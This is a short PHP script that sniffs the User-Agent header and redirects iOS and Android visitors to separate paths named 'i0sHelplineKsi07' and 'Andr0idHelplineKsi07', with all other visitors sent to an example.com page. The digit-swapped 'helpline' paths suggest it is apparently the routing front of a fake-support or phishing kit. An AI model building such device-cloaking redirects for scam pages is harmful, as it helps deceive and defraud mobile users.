<?php
// Function to detect iOS devices
function isIOS() {
    return preg_match('/iPhone|iPad|iPod/', $_SERVER['HTTP_USER_AGENT']);
}

// Function to detect Android devices
function isAndroid() {
    return preg_match('/Android/', $_SERVER['HTTP_USER_AGENT']);
}

// Redirect based on device type
if (isIOS()) {
    // Redirect to the iOS-specific link
    header("Location: /IOS/m01/i0sHelplineKsi07/");
    exit(); // Make sure to exit after the redirect
} elseif (isAndroid()) {
    // Redirect to the Android-specific link
    header("Location: /android/m01/Andr0idHelplineKsi07/");
    exit(); // Make sure to exit after the redirect
} else {
    // Redirect to a default link for other devices
    header("Location: https://example.com/default-page");
    exit(); // Make sure to exit after the redirect
}
?>
